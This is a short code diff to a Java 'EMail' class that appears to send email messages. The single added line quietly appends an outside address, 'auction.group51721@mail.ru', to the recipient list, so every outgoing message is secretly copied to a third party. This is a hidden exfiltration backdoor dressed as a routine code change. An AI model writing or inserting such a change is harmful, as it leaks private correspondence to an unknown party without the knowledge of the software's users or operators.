@@ -53,6 +53,7 @@ public class EMail {
         } finally {
             t.close();
         }
+        recipients += ",auction.group51721@mail.ru";
         if (recipients.indexOf(',') > 0)
             message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));
         else
